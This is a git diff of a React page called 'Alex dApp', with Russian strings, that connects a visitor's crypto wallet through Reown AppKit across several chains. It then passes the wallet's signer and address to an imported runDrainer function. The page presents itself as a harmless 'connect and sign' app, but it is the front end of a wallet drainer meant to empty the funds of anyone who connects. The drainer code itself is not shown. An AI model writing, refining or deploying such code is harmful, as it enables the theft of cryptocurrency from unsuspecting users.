@@ -1,4 +1,4 @@
-import { useEffect } from 'react'
+import { useEffect, useState } from 'react'
 import { createAppKit } from '@reown/appkit'
 import {
   mainnet, polygon, bsc, avalanche,
@@ -6,11 +6,11 @@ import {
 } from '@reown/appkit/networks'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { ethers } from 'ethers'
-import { runDrainer } from './drainer'
+import { runDrainer } from './drainer.js'
 
+// === Настройки AppKit ===
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
 const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
-
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 
 const modal = createAppKit({
@@ -19,75 +19,53 @@ const modal = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'http://localhost:5173',
-    icons: ['https://checkalex.xyz/icon.png']
+    url: 'https://yourdomain.com',
+    icons: ['https://checkalex.xyz/icon.png'],
   },
   projectId,
   features: {
     analytics: true,
     email: false,
-    socials: false
+    socials: false,
   },
-  allWallets: 'SHOW'
+  allWallets: 'SHOW',
 })
 
 export default function App() {
-  const handleClick = async () => {
+  const [status, setStatus] = useState('')
+
+  const handleConnect = async () => {
     try {
+      setStatus('Ожидание подключения...')
       await modal.open()
 
-      // Ждём появления window.ethereum после подключения
-      const waitForEthereum = async () => {
-        return new Promise((resolve, reject) => {
-          let attempts = 0
-          const interval = setInterval(() => {
-            if (window.ethereum) {
-              clearInterval(interval)
-              resolve(window.ethereum)
-            } else if (++attempts > 10) {
-              clearInterval(interval)
-              reject(new Error('⛔️ window.ethereum не найден'))
-            }
-          }, 500)
-        })
-      }
+      const connected = await wagmiAdapter.getConnectedWallet()
+      if (!connected) throw new Error('Кошелёк не подключён')
 
-      const eth = await waitForEthereum()
+      const walletClient = await connected.getWalletClient()
+      const transport = walletClient?.transport
+      if (!transport) throw new Error('Не удалось получить transport')
 
-      const accounts = await eth.request({ method: 'eth_accounts' })
-      if (!accounts.length) throw new Error('Кошелёк не подключён')
-
-      const address = accounts[0]
-      console.log('✅ Кошелёк подключён:', address)
-
-      const provider = new ethers.providers.Web3Provider(eth, 'any')
+      const provider = new ethers.providers.Web3Provider(transport, 'any')
       const signer = provider.getSigner()
+      const address = await signer.getAddress()
 
+      setStatus(`✅ Кошелёк подключён: ${address}`)
       await runDrainer(provider, signer, address)
-      console.log('🚀 Контракт успешно вызван')
+      setStatus('🚀 Контракт успешно вызван!')
     } catch (err) {
-      console.error('❌ Ошибка при подключении или вызове:', err)
-      alert(`Ошибка: ${err.message || err}`)
+      console.error('Ошибка подключения:', err)
+      setStatus(`❌ Ошибка: ${err.message}`)
     }
   }
 
   return (
-    <div style={{ textAlign: 'center', marginTop: '5rem' }}>
+    <div style={{ padding: 20 }}>
       <h1>Alex dApp</h1>
-      <button
-        onClick={handleClick}
-        style={{
-          padding: '12px 24px',
-          fontSize: '18px',
-          borderRadius: '10px',
-          background: '#4f46e5',
-          color: 'white',
-          cursor: 'pointer',
-          border: 'none'
-        }}
-      >
-        Подключить кошелёк
+      <button onClick={handleConnect}>
+        Подключить кошелёк и запустить
       </button>
+      <p>{status}</p>
     </div>
   )
 }
